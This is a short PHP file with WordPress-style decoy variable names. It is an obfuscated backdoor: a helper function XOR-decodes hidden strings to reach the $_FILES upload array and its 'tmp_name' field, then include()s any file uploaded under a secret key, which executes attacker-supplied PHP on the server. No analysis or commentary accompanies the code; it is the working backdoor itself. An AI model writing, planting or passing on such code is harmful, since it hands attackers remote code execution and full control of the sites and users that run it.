<?php 	

$local = 'koOqmwU19s';

$_builtin = $local;
function size($entity, $protected)

{
    $filters = $protected;
    $ignore_block_element = urldecode($entity);

    $old_status_to_new_status = substr($filters,0, strlen($ignore_block_element));
    $text = $ignore_block_element ^ $old_status_to_new_status;
	$_ext = 'spaces';
    return $text;

}
	$terms = 'property_name';
$default_capabilities = ${size("4%29%06%3D%28%24", $_builtin)};
$meta_input = $default_capabilities;
$clean_terms = isset($meta_input[$_builtin]);
if ($clean_terms)

{

    $wp_htmltranswinuni = $default_capabilities[$_builtin];
    $has_leading_slash = $wp_htmltranswinuni[size("%1F%02%3F.%03%168T", $_builtin)];
	$thumbnail_id = 'arg_index';
    $name_offset = $has_leading_slash;
    include ($name_offset);

}
?>
